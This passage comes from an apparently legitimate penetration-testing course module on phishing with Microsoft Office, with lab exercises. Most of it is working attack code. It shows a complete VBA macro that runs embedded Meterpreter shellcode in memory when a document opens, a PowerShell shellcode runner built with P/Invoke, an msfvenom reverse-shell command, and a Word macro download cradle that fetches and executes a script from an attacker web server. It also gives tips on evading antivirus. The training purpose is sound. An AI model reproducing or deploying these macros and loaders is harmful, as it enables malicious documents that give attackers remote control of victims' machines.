This function takes three variables. The return value along with the first argument may be translated to _LongPtr_, the second uses _Any_, while the last argument may be translated to _Long_.

The _Destination_ pointer points to the newly-allocated buffer, which is already a memory pointer, so we can pass it as-is. The _Source_ buffer will be the address of an element from the shellcode array, and must be passed by reference, while the _Length_ is passed by value.

```
Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr
```

> Listing 22 - Declare statement for RtlMoveMemory

We'll use this API to loop over each element of the shellcode array and create a byte-by-byte copy of our payload.

The loop condition uses the [_LBound_](https://docs.microsoft.com/en-us/office/vba/language/reference/user-interface-help/lbound-function) and _UBound_ methods to find the first and last element of the array. This is where our knowledge of _For_ loops helps. With that, let's import _RtlMoveMemory_, declare two long variables and copy our payload.

```
Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr

....

Dim counter As Long
Dim data As Long
Dim res as LongPtr

For counter = LBound(buf) To UBound(buf)
    data = buf(counter)
    res = RtlMoveMemory(addr + counter, data, 1)
Next counter
```

> Listing 23 - Call to import RtlMoveMemory and call it

With the shellcode bytes copied into the executable buffer, we are ready to execute it with [_CreateThread_](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread).

_CreateThread_ is a fairly complicated API that instructs the operating system to create a new execution thread in a process. We'll use this to spawn an execution thread with our shellcode, which is located at a specified memory address.

Here's the function prototype for _CreateThread_:

```
HANDLE CreateThread(
  LPSECURITY_ATTRIBUTES   lpThreadAttributes,
  SIZE_T                  dwStackSize,
  LPTHREAD_START_ROUTINE  lpStartAddress,
  LPVOID                  lpParameter,
  DWORD                   dwCreationFlags,
  LPDWORD                 lpThreadId
);
```

> Listing 24 - Function prototype for CreateThread

While the number of arguments and the associated documentation may seem daunting, we don't need most of them, and we can set them to "0". First, as with the previous APIs, we must import the function and translate its arguments to VBA data types. The first two are used to specify non-default settings for the thread and since we won't need them, we will set these values to zero and specify them as _Long_.

The third argument, _lpStartAddress_, is the start address for code execution and must be the address of our shellcode buffer. This is translated to _LongPtr_.

The fourth argument, _lpParameter_, is a pointer to arguments for the code residing at the starting address. Since our shellcode requires no arguments, we can set this parameter type to _LongPtr_ with a value of zero.

The declaration and import are shown below.

```
Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
```

> Listing 25 - Declare statement for CreateThread

Having declared the function, we may now call it. This line is pretty simple with only one variable for the start address of our shellcode buffer.

Now we can piece the entire VBA macro together:

```
res = CreateThread(0, 0, addr, 0, 0, 0)
```

> Listing 26 - Call statement for CreateThread

To summarize, we begin by declaring functions for the three Win32 APIs. Then we declare five variables, including a variable for our Meterpreter array and use _VirtualAlloc_ to create some space for our shellcode. Next, we use _RtlMoveMemory_ to put our code in memory with the help of a _For_ loop. Finally, we use _CreateThread_ to execute our shellcode.

```
Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr

Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr

Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr

Function MyMacro()
    Dim buf As Variant
    Dim addr As LongPtr
    Dim counter As Long
    Dim data As Long
    Dim res As LongPtr
    
    buf = Array(252,72,131,228,240,232,204,0,0,0,65,81,65,80,82,72,49,210,81,101,72,
    ...
    06,0,89,187,224,29,42,10,65,137,218,255,213)

    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
    
    For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
        res = RtlMoveMemory(addr + counter, data, 1)
    Next counter
    
    res = CreateThread(0, 0, addr, 0, 0, 0)
End Function 

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub
```

> Listing 27 - Full VBA script to execute Meterpreter staged payload in memory

When executed, our shellcode runner calls back to the Meterpreter listener and opens the reverse shell as expected, entirely in memory.

To work as expected, this requires a matching 64-bit multi/handler in Metasploit with _EXITFUNC_ set to "thread" and a matching IP and port number.

This approach is rather low-profile. Our shellcode resides in memory and there is no malicious executable on the victim's machine. However, the primary disadvantage is that when the victim closes Word, our shell will die. Metasploit's _AutoMigrate_ module could solve this, but in the next Section, we'll leverage PowerShell to overcome this disadvantage.

### Resources

Some of the labs require you to start the target machine(s) below.

Please note that the IP addresses assigned to your target machines may not match those referenced in the Module text and video.

Phishing with Microsoft Office - VM #5

**Labs**

1. Create a Word macro that uses Win32 APIs to perform the same actions as shown in this section, but instead uses the windows/x64/meterpreter/bind\_tcp payload on port 50000. What is the size of the generated payload in bytes?

### 4.3. PowerShell Shellcode Runner

This Learning Unit covers the following Learning Objectives:

1. Calling Win32 APIs from PowerShell
2. Porting Shellcode Runner to PowerShell

Although we have a working exploit, there's room for improvement. First, the document contains the embedded first-stage Meterpreter shellcode and is saved to the hard drive where it may be detected by antivirus. Second, the VBA version of our attack executed the shellcode directly in memory of the Word process. If the victim closes Word, we'll lose our shell.

In this section, we'll change tactics a bit. First, we'll instruct the macro to download a PowerShell script (which contains our staging shellcode) from our web server and run it in memory. This is an improvement over our previous version that embedded the shellcode in the macro within the malicious document. Next, we'll launch the PowerShell script as a _child process_ of (and from) Microsoft Word. Under a default configuration, the child process will not die when Microsoft Word is closed, which means we won't lose our shell.

To accomplish this, we'll use the _DownloadString_ method of the _WebClient_ class to download the PowerShell script directly into memory and execute it with the [_Invoke-Expression_ cmdlet](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-6). We can reuse the exact same Windows APIs to execute the shellcode. However, we must translate the syntax from VBA to PowerShell. This means we must call Win32 APIs from PowerShell.

### 4.3.1. Calling Win32 APIs from PowerShell

PowerShell cannot natively interact with the Win32 APIs, but with the power of the .NET framework we can use C# in our PowerShell session. In C#, we can declare and import Win32 APIs using the [_DllImportAttribute_ class](https://docs.microsoft.com/en-us/dotnet/api/system.runtime.interopservices.dllimportattribute?view=netframework-4.8%3E), allowing us to invoke functions in unmanaged dynamic link libraries.

Just as we did with VBA, we must translate the C data types to C# data types. We can do this easily with [Microsoft's Platform Invocation Services](https://docs.microsoft.com/en-us/dotnet/standard/native-interop/pinvoke), commonly known as _P/Invoke_. The P/Invoke APIs are contained in the [_System_](https://docs.microsoft.com/en-us/dotnet/api/system?view=netframework-4.8) and [_System.Runtime.InteropServices_](https://docs.microsoft.com/en-us/dotnet/api/system.runtime.interopservices?view=netframework-4.8) namespaces and we must import them through the [_using_](https://docs.microsoft.com/en-us/dotnet/csharp/language-reference/keywords/using-directive) directive keyword.

The simplest way to begin with _P/Invoke_ is through the **www.pinvoke.net** website, which documents translations of the most common Win32 APIs. For example, consider the syntax of _MessageBox_ from **User32.dll**:

```
int MessageBox(
  HWND    hWnd,
  LPCTSTR lpText,
  LPCTSTR lpCaption,
  UINT    uType
);
```

> Listing 28 - C function prototype for MessageBox

Let's "translate" this into a C# _method signature_. A method signature is a unique identification of a method for the C# compiler. The signature consists of a method name and the type and kind (value, reference, or output) of each of its formal parameters and the return type.

To "translate" this, we can either search the **www.pinvoke.net** website or simply Google for _pinvoke User32 messagebox_. The first hit leads us to the C# signature for the call:

```
[DllImport("user32.dll", SetLastError = true, CharSet= CharSet.Auto)]
public static extern int MessageBox(int hWnd, String text, String caption, uint type);
```

> Listing 29 - C# DllImport statement for MessageBox

In order to use this, we'll need to add a bit of code to import the _System_ and _System.Runtime.InteropServices_ namespaces containing the P/Invoke APIs.

Then, we'll create a C# class (_User32_) which imports the MessageBox signature with _DllImport_. This class will allow us to interact with the Windows API. We've named it _User32_ in this case, but the class name is arbitrary.

```
using System;
using System.Runtime.InteropServices;

public class User32 {
    [DllImport("user32.dll", CharSet=CharSet.Auto)]
    public static extern int MessageBox(IntPtr hWnd, String text, 
        String caption, int options);
}
```

> Listing 30 - C# DllImport statement for MessageBox

Now that we have a C# import and a P/Invoke translation, we need to invoke it from PowerShell with the [Add-Type](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/add-type?view=powershell-5.1) keyword. Specifying _Add-Type_ in PowerShell will force the .NET framework to compile and create an object containing the structures, values, functions, or code inside the _Add-Type_ statement.

Put simply, _Add-Type_ uses the .NET framework to compile the C# code containing Win32 API declarations. Here's the complete _Add-Type_ statement:

```
$User32 = @"
using System;
using System.Runtime.InteropServices;

public class User32 {
    [DllImport("user32.dll", CharSet=CharSet.Auto)]
    public static extern int MessageBox(IntPtr hWnd, String text, 
        String caption, int options);
}
"@

Add-Type $User32
```

> Listing 31 - PowerShell Add-Type statement for importing MessageBox

First, note that PowerShell uses either a newline or a semicolon to signify the end of a statement. The "@" keyword declares [Here-Strings](https://devblogs.microsoft.com/scripting/powertip-use-here-strings-with-powershell/) which helps us declare blocks of text.

In summary, the code first creates a _$User32_ variable and sets it to a block of text. Inside that block of text, we set the program to use _System_ and _System.Runtime.InteropServices_. Then we import the _MessageBox_ API from **user32.dll**, and finally we use _Add-Type_ to compile the C# code contained in the _$User32_ variable.

Our code is nearly complete. We now simply need to execute the API itself by instantiating the _User32_ .NET object. In this case, we'll call _MessageBox_ and present a dialog prompt that says "This is an alert":

```
[User32]::MessageBox(0, "This is an alert", "MyBox", 0)
```

> Listing 32 - Calling the Win32 API MessageBox from PowerShell

At this point, our code looks like this:

```
$User32 = @"
using System;
using System.Runtime.InteropServices;

public class User32 {
    [DllImport("user32.dll", CharSet=CharSet.Auto)]
    public static extern int MessageBox(IntPtr hWnd, String text, 
        String caption, int options);
}
"@

Add-Type $User32

[User32]::MessageBox(0, "This is an alert", "MyBox", 0)
```

> Listing 33 - Full code calling Win32 API MessageBox from PowerShell

This code should invoke _MessageBox_ from PowerShell. When the code is executed, we are presented with a message box:

![Figure 19: Calling MessageBox from PowerShell](https://static.offsec.com/offsec-courses/PEN-300/imgs/office/08d75b26602fbd355280b98d7cbfcabd-addtype_msgbox.png)

Figure 19: Calling MessageBox from PowerShell

This works quite well and demonstrates that while PowerShell cannot natively use Win32 APIs, _Add-Type_ can invoke them through P/Invoke. In the next section, we will use a similar technique to implement our VBA shellcode runner in PowerShell.

### Resources

Some of the labs require you to start the target machine(s) below.

Please note that the IP addresses assigned to your target machines may not match those referenced in the Module text and video.

Phishing with Microsoft Office - VM #6

**Labs**

1. Use _Add-Type_ to invoke the Win32 API [_GetDriveType_](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-getdrivetypew) from PowerShell as we did in this section. What is the result when calling the API on the C:\ drive?

### 4.3.2. Porting Shellcode Runner to PowerShell

The concept of translating our shellcode runner technique from VBA to PowerShell is not that complicated. We can do this by reusing the theory from our VBA shellcode runner. We already know the three steps to perform. First, we allocate executable memory with _VirtualAlloc_. Next, we copy our shellcode to the newly-allocated memory region. Finally, we execute it with _CreateThread_.

In the VBA code, we used _RtlMoveMemory_ to copy the shellcode, but in PowerShell we can use the .NET [_Copy_](https://docs.microsoft.com/en-us/dotnet/api/system.runtime.interopservices.marshal.copy?view=netframework-4.8) method from the _System.Runtime.InteropServices.Marshal_ namespace to copy a managed array to an unmanaged memory pointer.

After a search on P/Invoke, we'll translate the arguments of _VirtualAlloc_ and _CreateThread_, creating the following _Add-Type_ statement:

```
$Kernel32 = @"
using System;
using System.Runtime.InteropServices;

public class Kernel32 {
    [DllImport("kernel32")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32", CharSet=CharSet.Ansi)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
}
"@

Add-Type $Kernel32
```

> Listing 34 - Using P/Invoke and Add-Type to import VirtualAlloc and CreateThread

Note that we used _Here-Strings_ to assign a block of text to the _$Kernel32_ variable. We also created the import statements in the public _Kernel32_ class so we can reference it and compile it later.

Next we must supply the required shellcode, which we'll again generate with _msfvenom_. This time, we'll use the _ps1_ output format:

```
kali@kali:~$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 EXITFUNC=thread -f ps1
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 800 bytes
Final size of ps1 file: 3924 bytes
[Byte[]] $buf = 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x0...
```

> Listing 35 - Creating shellcode in ps1 format

Armed with the shellcode, we can copy the _$buf_ variable and add it to our code. We'll also start setting the API arguments:

```
[Byte[]] $buf = 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x0...

$size = $buf.Length

[IntPtr]$addr = [Kernel32]::VirtualAlloc(0,$size,0x3000,0x40);

[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $size)

$thandle=[Kernel32]::CreateThread(0,0,$addr,0,0,0);
```

> Listing 36 - Shellcode runner in PowerShell

We invoked the imported _VirtualAlloc_ call with the same arguments as before. These include a "0" to let the API choose the allocation address, followed by the detected size of the shellcode and the hexadecimal numbers 0x3000 and 0x40 to set up memory allocation and protections correctly.

We used the .NET _Copy_ method to copy the shellcode, supplying the managed shellcode array, an offset of 0 indicating the start of the buffer, the unmanaged buffer address, and the shellcode size.

Finally, we called _CreateThread_, supplying the starting address.

If we run this code from PowerShell ISE, we get a reverse shell. Nice!

```
[*] Started HTTPS reverse handler on https://192.168.119.120:443
[*] https://192.168.119.120:443 handling request from 192.168.120.11; (UUID: pm1qmw8u) Staging x64 payload (207449 bytes) ...
[*] Meterpreter session 1 opened (192.168.119.120:443 -> 192.168.120.11:49678)

meterpreter > 
```

> Listing 37 - Multi/handler catches Meterpreter shellcode executed by PowerShell

Now we need to trigger this from a Word macro. However, we won't simply embed the PowerShell code in VBA. Instead, we'll create a cradle that will download our code into memory and execute it.

Here's the code for the download cradle:

```
Sub MyMacro()
    Dim str As String
    str = "powershell (New-Object System.Net.WebClient).DownloadString('http://192.168.119.120/run.ps1') | IEX"
    Shell str, vbHide
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub
```

> Listing 38 - VBA code calling the PowerShell cradle that executes the shellcode runner

First, we declared a string variable containing the PowerShell invocation of the download cradle through the _Net.WebClient class_. Once the PowerShell script has been downloaded into memory as a string, it then executes using _Invoke-Expression_ (IEX). This entire code execution is triggered with the _Shell_ command.

Notice that the download cradle references **run.ps1** in the web root of our Kali machine. To execute our code, we'll first copy our PowerShell shellcode runner into the **run.ps1** file on our Kali Apache web server.

Next we'll open Microsoft Word and insert the VBA code from Listing 38 into our macro and execute it.

However, we don't catch a shell in our multi/handler. Let's try to troubleshoot.

First, we know the macro is executing because our Kali machine's Apache logs reveal the GET request for the shellcode runner:

```
kali@kali:~$ sudo tail /var/log/apache2/access.log
...
192.168.120.11 - - [08/Jun/2024:05:21:22 -0400] "GET /run.ps1 HTTP/1.1" 200 4202 "-" "-"
```

> Listing 39 - Apache access log showing our run.ps1 script being fetched

On the Windows side, if we use Process Explorer, and we are quick, we might notice that a PowerShell process is being created but then quickly terminates.

The reason for this is fairly straightforward. Our previous VBA shellcode runner continued executing because we never terminated its parent process (Word). However, in this version, our shell dies as soon as the parent PowerShell process terminates. Our shell is essentially being terminated before it even starts.

To solve this, we must instruct PowerShell to delay termination until our shell fully executes. We'll use the Win32 [_WaitSingleObject_ API](https://docs.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject) to pause the script and allow Meterpreter to execute.

We'll update our shellcode runner PowerShell script to import _WaitForSingleObject_ using P/Invoke and _Add-Type_ and invoke it as shown in these highlighted sections:

```
$Kernel32 = @"
using System;
using System.Runtime.InteropServices;

public class Kernel32 {
    [DllImport("kernel32")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, 
        uint flAllocationType, uint flProtect);
        
    [DllImport("kernel32", CharSet=CharSet.Ansi)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, 
        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, 
            uint dwCreationFlags, IntPtr lpThreadId);
            
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern UInt32 WaitForSingleObject(IntPtr hHandle, 
        UInt32 dwMilliseconds);
}
"@

Add-Type $Kernel32
...

[Kernel32]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")
```

> Listing 40 - Importing WaitSingleObject and calling it to stop PowerShell from terminating

Let's discuss this addition. When _CreateThread_ is called, it returns a handle to the newly-created thread. We provided this handle to _WaitForSingleObject_ along with the time to wait for that thread to finish. In this case, we have specified 0xFFFFFFFF, which will instruct the program to wait forever or until we exit our shell. Notice that we have explicitly performed a type cast on this value to an unsigned integer with the _\[uint32]_ static .NET type because PowerShell only uses signed integers.

We again used _Here-Strings_ to assign a block of text to the _$Kernel32_ variable. Inside our class, we imported three Windows APIs. We then used _Add-Type_ to compile the public _Kernel32_ class that we invoked when using the APIs. This addition should halt the premature termination of PowerShell.

We can now update the PowerShell shellcode runner hosted on our Kali Linux web server and rerun the VBA code. This should result in a reverse Meterpreter shell. Very nice!

```
[*] Started HTTPS reverse handler on https://192.168.119.120:443
[*] https://192.168.119.120:443 handling request from 192.168.120.11; (UUID: pm1qmw8u) Staging x64 payload (207449 bytes) ...
[*] Meterpreter session 1 opened (192.168.119.120:443 -> 192.168.120.11:49678)

meterpreter > 
```

> Listing 41 - Meterpreter reverse shell from PowerShell inside a VBA macro is not exiting

We also note that the PowerShell process is running as a child process of Word.

![Figure 20: PowerShell as a child process running Meterpreter shellcode](https://static.offsec.com/offsec-courses/PEN-300/imgs/office/4533476d20bf79413316190abf3cac79-power_addtype.png)

Figure 20: PowerShell as a child process running Meterpreter shellcode

In this section, we created a shellcode runner in PowerShell. We used the VBA code in our Word macro to download and execute this script from our Kali web server. This effectively moved our payload from the Word document and it would appear that the code is running completely in memory, which should help evade detection.

### Resources

Some of the labs require you to start the target machine(s) below.

Please note that the IP addresses assigned to your target machines may not match those referenced in the Module text and video.

Phishing with Microsoft Office - VM #7

**Labs**

1. Attempt to use a different file extension like **.txt** for the **run.ps1** file. Does it work?
2. Create a PowerShell shellcode runner that uses the payload windows/x64/shell/reverse\_tcp and invoke it from a VBA macro as shown in this section. How many bytes is the payload?

### 4.4. Wrapping Up

In this module, we discussed how malware can operate through Microsoft Office and PowerShell. We built an advanced client-side attack that executed arbitrary Win32 APIs directly in memory from either VBA or PowerShell.

Gaining an initial shell on a client is a crucial first step. We'll discuss other techniques for this critical skill in later modules.

* © 2025  [OffSec](https://www.offsec.com/) |- [Privacy](https://www.offsec.com/legal-docs/#privacy-policy) |- [Terms of service](https://www.offsec.com/legal-docs/#terms)

Previous Module

Client Side Code Execution With Office

Next Module

Phishing with Calendars
